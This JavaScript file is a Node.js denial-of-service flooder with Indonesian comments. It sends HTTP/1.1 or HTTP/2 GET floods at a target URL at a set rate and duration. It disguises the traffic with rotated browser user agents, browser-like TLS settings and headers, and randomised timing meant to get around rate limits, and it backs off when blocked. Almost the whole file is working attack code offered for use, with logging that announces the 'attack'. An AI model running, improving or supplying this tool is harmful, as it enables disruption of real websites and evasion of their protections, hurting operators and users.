const fs = require('fs');
const https = require('https');
const http2 = require('http2');
const tls = require('tls');
const crypto = require('crypto');
const { performance } = require('perf_hooks');
const { format } = require('url');

// User-Agent yang realistis
const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.0.0 Mobile/15E148 Safari/604.1"
];

// Cipher Suites yang umum digunakan browser
const CIPHER_SUITES = [
  'TLS_AES_256_GCM_SHA384',
  'TLS_CHACHA20_POLY1305_SHA256',
  'TLS_AES_128_GCM_SHA256',
  'ECDHE-ECDSA-AES256-GCM-SHA384',
  'ECDHE-RSA-AES256-GCM-SHA384',
  'ECDHE-ECDSA-AES128-GCM-SHA256',
  'ECDHE-RSA-AES128-GCM-SHA256'
];

// TLS Versions yang valid
const TLS_VERSIONS = {
  min: 'TLSv1.2',
  max: 'TLSv1.3'
};

// Fungsi untuk membuat TLS context yang realistis
function createTLSContext() {
  return {
    ciphers: CIPHER_SUITES.join(':'),
    honorCipherOrder: false,
    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION,
    minVersion: TLS_VERSIONS.min,
    maxVersion: TLS_VERSIONS.max,
    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256',
    ALPNProtocols: ['h2', 'http/1.1']
  };
}

// Fungsi untuk mengacak header
function getRandomHeaders(targetHost, cookie, userAgent = null) {
  const ua = userAgent || USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
  return {
    'Host': targetHost,
    'User-Agent': ua,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cookie': cookie,
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1'
  };
}

// Fungsi untuk bypass rate limit dengan jitter
function applyJitter(delay) {
  const jitter = Math.floor(Math.random() * delay * 0.3); // 30% jitter
  return delay + (Math.random() < 0.5 ? -jitter : jitter);
}

// Fungsi HTTP/2 Flooder
function h2Flooder(url, cookie, options = {}) {
  const { userAgent, proxy, duration, rate } = options;
  const target = new URL(url);
  const host = target.hostname;
  const path = target.pathname + target.search;

  const settings = {
    enablePush: false,
    initialWindowSize: 65535
  };

  const client = http2.connect(target.origin, {
    createConnection: () => {
      const socket = proxy ? createProxySocket(proxy, target.host) : tls.connect(443, {
        host,
        servername: host,
        ...createTLSContext()
      });
      return socket;
    },
    settings
  });

  let requestsSent = 0;
  let intervalId;

  client.on('error', (err) => {
    console.error(`[HTTP/2 ERROR] ${err.message}`);
    clearInterval(intervalId);
    client.close();
  });

  function sendRequest() {
    if (requestsSent >= rate) return;

    const headers = {
      ':method': 'GET',
      ':path': path,
      ...getRandomHeaders(host, cookie, userAgent)
    };

    const req = client.request(headers);

    req.on('response', (headers) => {
      const status = headers[':status'];
      if (status === 429 || status === 403) {
        console.log(`[RATE LIMIT] Status ${status}, adjusting rate...`);
        clearInterval(intervalId);
        setTimeout(() => {
          intervalId = setInterval(sendRequest, applyJitter(1000 / (rate / 2)));
        }, 5000);
      }
    });

    req.on('error', (err) => {
      console.error(`[REQ ERROR] ${err.message}`);
    });

    req.end();
    requestsSent++;
  }

  intervalId = setInterval(() => {
    requestsSent = 0;
  }, 1000);

  const interval = setInterval(sendRequest, applyJitter(1000 / rate));

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(intervalId);
    client.close();
    console.log("[FLOOD] Duration ended.");
  }, duration * 1000);
}

// Fungsi HTTP/1.1 Flooder
function h1Flooder(url, cookie, options = {}) {
  const { userAgent, proxy, duration, rate } = options;
  const target = new URL(url);
  const host = target.hostname;
  const path = target.pathname + target.search;

  const requestOptions = {
    method: 'GET',
    headers: getRandomHeaders(host, cookie, userAgent),
    agent: proxy ? new ProxyAgent(proxy) : new https.Agent({
      ...createTLSContext(),
      servername: host
    })
  };

  let requestsSent = 0;
  let intervalId;

  function sendRequest() {
    if (requestsSent >= rate) return;

    const req = https.request(target.origin + path, requestOptions, (res) => {
      if (res.statusCode === 429 || res.statusCode === 403) {
        console.log(`[RATE LIMIT] Status ${res.statusCode}, adjusting rate...`);
        clearInterval(intervalId);
        setTimeout(() => {
          intervalId = setInterval(sendRequest, applyJitter(1000 / (rate / 2)));
        }, 5000);
      }

      res.resume();
    });

    req.on('error', (err) => {
      console.error(`[H1 ERROR] ${err.message}`);
    });

    req.end();
    requestsSent++;
  }

  intervalId = setInterval(() => {
    requestsSent = 0;
  }, 1000);

  const interval = setInterval(sendRequest, applyJitter(1000 / rate));

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(intervalId);
    console.log("[FLOOD] Duration ended.");
  }, duration * 1000);
}

// Fungsi utama untuk memulai flood
function startFlood(options) {
  const { url, cookie, userAgent, proxy, duration, rate, protocol } = options;

  console.log(`[FLOOD] Starting attack on ${url} for ${duration}s at ${rate} RPS`);
  console.log(`[FLOOD] Using protocol: ${protocol}`);

  if (protocol === 'http2') {
    h2Flooder(url, cookie, { userAgent, proxy, duration, rate });
  } else {
    h1Flooder(url, cookie, { userAgent, proxy, duration, rate });
  }
}

// Ekspor fungsi untuk digunakan di browser.js
module.exports = {
  start: startFlood
};
